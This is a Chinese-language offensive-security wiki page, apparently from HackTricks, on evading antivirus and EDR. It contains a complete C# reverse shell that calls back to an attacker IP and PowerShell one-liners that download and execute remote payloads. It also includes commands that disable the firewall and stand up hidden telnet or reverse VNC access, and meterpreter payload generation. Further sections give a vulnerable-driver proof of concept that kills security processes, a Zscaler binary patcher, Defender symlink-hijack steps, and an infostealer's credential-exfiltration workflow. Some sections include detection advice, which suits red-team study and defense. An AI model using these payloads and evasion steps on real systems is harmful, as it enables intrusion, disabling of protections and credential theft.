<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

它是将后渗透恶意代码**注入到其自身进程中**。这样可以避免创建新进程并被 AV 扫描，但缺点是如果有效载荷执行出现问题，进程可能崩溃，你就有**更大几率****失去你的 beacon**。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果想了解更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# 程序集，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所示，可以通过让被攻陷机器访问**安装在攻击者控制的 SMB 共享上的解释器环境**，用其他语言执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制和环境，你可以在被攻陷机器的内存中**执行这些语言的任意代码**。

仓库指出：Defender 仍会扫描脚本，但通过使用 Go、Java、PHP 等，我们在绕过静态签名方面有**更大的灵活性**。使用这些语言的未混淆反向 shell 脚本进行测试已证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操纵访问令牌或像 EDR、AV 这样的安全产品**，降低其权限，使进程不会终止但没有权限检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取对安全进程令牌的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，仅需在受害者电脑上部署 Chrome Remote Desktop 即可轻易接管并维持持久性：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机器上静默运行安装程序（需要管理员）： `msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导将要求你授权；点击 Authorize 按钮继续。
4. 执行给定参数并做适当调整： `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （注意 pin 参数允许在不使用 GUI 的情况下设置 PIN。）

## Advanced Evasion

规避检测是个非常复杂的话题，有时在单一系统中就必须考虑许多不同的遥测来源，因此在成熟环境中几乎不可能完全不被发现。

你面临的每个环境都有各自的强项与弱点。

强烈建议观看来自 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以初步了解更多高级规避技术。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一场关于 Evasion in Depth 的精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ，它会**移除二进制的部分**，直到**找出 Defender 将哪些部分视为恶意**并将结果分离给你。\
另一个做**相同事情**的工具是 [**avred**](https://github.com/dobin/avred)，并在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供该服务的开放网页。

### **Telnet Server**

直到 Windows10，所有 Windows 都带有一个 **Telnet server**，你可以（以管理员）安装，执行：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
当系统启动时让它**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (stealth) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (请选择 bin downloads，而不是 setup)

**ON THE HOST**: 执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建的** 文件 _**UltraVNC.ini**_ 移动到 **victim** 中

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. 然后，在 **victim** 中：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为了保持隐蔽性，你必须避免以下几种行为

- 如果 `winvnc` 已在运行，不要再次启动，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
- 不要在没有 `UltraVNC.ini` 的同一目录下启动 `winvnc`，否则会导致 [the config window](https://i.imgur.com/rfMQWcf.png) 被打开
- 不要运行 `winvnc -h` 来查看帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **start the lister**，并用以下命令 **execute** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前 Defender 会非常快速地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
配合使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器的示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台实用程序，在投放勒索软件之前禁用端点防护。该工具携带其**自带的有漏洞但已*签名*的驱动**并滥用它来发出特权内核操作，甚至 Protected-Process-Light (PPL) 的 AV 服务也无法阻止这些操作。

关键要点
1. **Signed driver**: 写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是来自 Antiy Labs “System In-Depth Analysis Toolkit” 的合法签名驱动 `AToolsKrnl64.sys`。因为该驱动拥有有效的 Microsoft 签名，即使在 Driver-Signature-Enforcement (DSE) 启用时也会被加载。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为**内核服务**，第二行启动它，使 `\\.\ServiceMouse` 可以从用户态访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD 完全绕过用户态保护；在内核中执行的代码可以打开*受保护*进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他加固特性的限制。

检测 / 缓解
•  启用 Microsoft 的易受攻击驱动阻止列表（`HVCI`, `Smart App Control`），以便 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监控新 *kernel* 服务的创建，并在驱动从可被任意写入的目录加载或不在允许列表中时触发告警。  
•  监视对自定义设备对象的用户态句柄随后的可疑 `DeviceIoControl` 调用。

### 通过磁盘二进制补丁绕过 Zscaler Client Connector 的 Posture 检查

Zscaler 的 **Client Connector** 在本地应用设备 posture 规则，并依赖 Windows RPC 将结果传达给其他组件。两个弱设计使得完全绕过成为可能：

1. Posture 评估**完全在客户端执行**（只向服务器发送一个布尔值）。  
2. 内部 RPC 端点仅验证连接的可执行文件是否**由 Zscaler 签名**（通过 `WinVerifyTrust`）。

通过**在磁盘上补丁四个已签名的二进制文件**，两种机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此所有检查都被视为合规 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 任何（即使未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 被短路 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启服务栈后：

* **All** posture checks 显示为 **green/compliant**。
* 未签名或被修改的 binaries 可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机可对由 Zscaler policies 定义的 internal network 进行不受限访问。

本案例展示了如何通过少量 byte patches 击破纯粹的 client-side trust decisions 和简单的 signature checks。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) 强制执行 signer/level hierarchy，使得只有相同或更高级别的 protected processes 能相互篡改。  
从攻击角度，如果你能够合法启动一个 PPL-enabled binary 并控制其 arguments，就可以将良性功能（例如 logging）转变为一个受限的、由 PPL 支持的 write primitive，用以针对 AV/EDR 使用的 protected directories。

什么条件会使进程以 PPL 运行
- 目标 EXE（及任何加载的 DLLs）必须使用 PPL-capable EKU 签名。
- 该进程必须通过 CreateProcess 创建，并使用标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者匹配的兼容 protection level（例如，对 anti-malware 签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 level 在创建时会失败。

另见有关 PP/PPL 和 LSASS 保护的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher 工具
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用模式：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我生成进程，并接受一个参数，用于将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入将由 PPL 支持执行。
- ClipUp 无法解析包含空格的路径；在指向通常受保护的位置时请使用 8.3 短文件名（短路径）。

8.3 short path helpers
- 列出短名：在每个父目录运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用支持 PPL 的启动器（例如 CreateProcessAsPPL），以 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传入 ClipUp 的日志路径参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有需要使用 8.3 短文件名。
3) 如果目标二进制文件在 AV 运行时通常被打开/锁定（例如 MsMpEng.exe），通过安装一个能更早可靠运行的自启动服务，在 AV 启动前安排在引导时写入。使用 Process Monitor（引导日志）验证引导顺序。
4) 重启后，带 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，从而损坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
说明与限制
- 无法控制 ClipUp 写入内容本身，只能控制放置位置；该原语更适合破坏而非精确内容注入。
- 需要 local admin/SYSTEM 权限来安装/启动服务，并需要一个重启窗口。
- 时机至关重要：目标文件不能被打开；引导时执行可以避免文件锁。

检测
- 在引导相关时段，检测以非标准参数创建的 `ClipUp.exe` 进程，尤其当其父进程由非标准启动器发起时。
- 新建为自动启动且指向可疑二进制文件的服务，且这些服务持续在 Defender/AV 之前启动。调查在 Defender 启动失败前的服务创建/修改情况。
- 对 Defender 二进制/Platform 目录进行文件完整性监控；注意受保护进程标志进程所进行的意外文件创建/修改。
- ETW/EDR 遥测：查找以 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制异常使用 PPL 级别的情况。

缓解措施
- WDAC/Code Integrity：限制哪些已签名二进制可以以 PPL 运行以及允许的父进程；阻止在非合法上下文中调用 ClipUp。
- 服务管理：限制创建/修改自动启动服务的能力，并监控启动顺序被操纵的情况。
- 确保 Defender tamper protection 和 early-launch protections 已启用；调查指示二进制文件损坏的启动错误。
- 如果与环境兼容，考虑在承载安全工具的卷上禁用 8.3 short-name generation（需彻底测试）。

关于 PPL 和工具的参考
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender 通过枚举以下目录下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择在字典序上最大的版本字符串的子文件夹（例如 `4.18.25070.5-0`），然后从该处启动 Defender 服务进程（并相应地更新服务/注册表路径）。该选择信任目录项，包括目录重解析点 (symlinks)。管理员可以利用这一点将 Defender 重定向到攻击者可写的路径，从而实现 DLL sideloading 或服务中断。

前提条件
- Local Administrator（需要在 Platform 文件夹下创建目录/符号链接）
- 能够重启或触发 Defender 平台重新选择（引导时的服务重启）
- 仅需内置工具（mklink）

为什么可行
- Defender 会阻止其自身文件夹内的写入，但其平台选择信任目录项，并选择字典序上最大的版本，而不验证目标是否解析到受保护/受信任的路径。

逐步说明（示例）
1) 准备当前 platform 文件夹的一个可写克隆，例如 `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发器选择 (建议重启):
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下看到新的进程路径，并且服务配置/注册表会反映该位置。

Post-exploitation options
- DLL sideloading/code execution: 覆盖或替换 Defender 从其 application directory 加载的 DLLs，以在 Defender 的进程中执行 code。参见上文部分： [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 删除 version-symlink，使得下次启动时配置的路径无法解析，Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：该技术本身不提供权限提升；需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以通过挂钩目标模块的 Import Address Table (IAT)，并将选定的 APIs 路由到攻击者控制的 position‑independent code (PIC)，把运行时规避从 C2 implant 移出并内置到目标模块中。这将规避手段推广到超出许多套件暴露的小 API 面（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- 使用 reflective loader（prepended 或 companion）在目标模块旁部署一个 PIC blob。该 PIC 必须是自包含且 position‑independent。
- 在宿主 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR 并修补针对的 IAT 条目（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），使其指向精简的 PIC 封装函数。
- 每个 PIC 封装在通过 tail‑call 调用真实 API 地址之前执行规避措施。典型规避包括：
  - 在调用前后进行内存遮掩/取消遮掩（例如对 beacon 区域加密、将 RWX→RX、更改页面名称/权限），然后在调用后恢复。
  - Call‑stack spoofing：构造一个看起来正常的栈并切换进入目标 API，使调用栈分析解析出期望的帧。
  - 为了兼容，导出一个接口，使 Aggressor 脚本（或等效工具）能够注册要为 Beacon、BOFs 和 post‑ex DLLs 钩挂的 APIs。

Why IAT hooking here
- 对使用被钩导入的任何代码都有效，无需修改工具代码或依赖 Beacon 代理特定 APIs。
- 覆盖 post‑ex DLLs：钩挂 LoadLibrary* 可以拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对其 API 调用应用相同的掩蔽/栈规避。
- 通过封装 CreateProcessA/W，可以在面对基于调用栈的检测时恢复对生成进程的 post‑ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
说明
- 在重定位/ASLR 之后且在首次使用该 import 之前应用补丁。像 TitanLdr/AceLdr 这样的 Reflective loaders 展示了在被加载模块的 DllMain 期间进行 hooking。
- 保持 wrapper 尽量小并且 PIC 安全；通过在打补丁前捕获的原始 IAT 值或通过 LdrGetProcedureAddress 来解析真实 API。
- 对于 PIC 使用 RW → RX 的转换，并避免留下同时可写和可执行的页面。

Call‑stack spoofing stub
- Draugr‑style PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后再转入真实 API。
- 这能绕过那些期望来自 Beacon/BOFs 到敏感 APIs 的规范调用栈的检测。
- 将其与 stack cutting/stack stitching 技术配合使用，以便在 API prologue 之前落入预期的栈帧内。

操作集成
- 将 reflective loader 置于 post‑ex DLLs 之前，以便在 DLL 加载时 PIC 和 hooks 自动初始化。
- 使用 Aggressor 脚本注册目标 APIs，使 Beacon 和 BOFs 无需修改代码即可透明地受益于相同的规避路径。

检测/DFIR 注意事项
- IAT 完整性：解析到非映像（heap/anon）地址的条目；对导入指针进行周期性验证。
- 栈异常：返回地址不属于已加载映像；突然转入非映像的 PIC；RtlUserThreadStart 祖先不一致。
- Loader 遥测：进程内对 IAT 的写入、在早期 DllMain 中修改 import thunks 的活动、加载时创建的意外 RX 区域。
- 镜像加载规避：如果 hooking LoadLibrary*，监视与内存掩蔽事件相关联的可疑 automation/clr 程序集加载。

相关构建模块和示例
- 在加载期间执行 IAT 打补丁的 Reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack‑cutting PIC（stackcutting）
- PIC call‑stack spoofing stubs（例如 Draugr）

## SantaStealer 的实战手法：用于无文件规避和凭证窃取

SantaStealer（又名 BluelineStealer）展示了现代信息窃取器如何在单一工作流中将 AV bypass、anti-analysis 与凭证访问结合起来。

### Keyboard layout gating & sandbox delay

- 一个配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现 Cyrillic 布局，样本会丢弃一个空的 `CIS` 标记并在运行 stealers 之前终止，确保它在被排除的语言环境中不会触发，同时留下一个供威胁狩猎使用的工件。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层 `check_antivm` 逻辑

- Variant A 遍历进程列表，使用自定义滚动校验和对每个名称进行哈希，并将其与嵌入的调试器/沙箱黑名单比较；它对计算机名重复计算校验和并检查工作目录如 `C:\analysis`。
- Variant B 检查系统属性（进程数下限、最近的正常运行时间），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox 增强组件，并在 sleep 周期前后执行时间检测以发现单步执行。任何命中都在模块启动前中止。

### 无文件 helper + 双 ChaCha20 反射加载

- 主 DLL/EXE 嵌入了一个 Chromium credential helper，该 helper 要么被写入磁盘，要么被手动映射到内存；fileless 模式下 helper 自行解析 imports/relocations，因此不会写入任何 helper 工件。
- 该 helper 存储了一个经双重 ChaCha20 加密的二阶段 DLL（two 32-byte keys + 12-byte nonces）。在两次解密后，它以反射方式加载该 blob（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator 例程使用 direct-syscall 反射式 process hollowing 将代码注入到运行中的 Chromium 浏览器，继承 AppBound Encryption keys，并直接从 SQLite 数据库解密密码/cookies/信用卡信息，尽管存在 ABE 硬化。

### 模块化内存收集 & 分块 HTTP exfil

- `create_memory_based_log` 遍历全局 `memory_generators` 函数指针表，并为每个启用模块（Telegram、Discord、Steam、截图、文档、浏览器扩展等）生成一个线程。每个线程将结果写入共享缓冲区，并在大约 45s 的 join 窗口后报告其文件计数。
- 完成后，所有内容使用静态链接的 `miniz` 库压缩为 `%TEMP%\\Log.zip`。`ThreadPayload1` 然后睡眠 15s，并将归档以 10 MB 块通过 HTTP POST 流式上传到 `http://<C2>:6767/upload`，伪装为浏览器的 `multipart/form-data` 边界（`----WebKitFormBoundary***`）。每个块添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个块追加 `complete: true`，以便 C2 知道重新组装完成。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
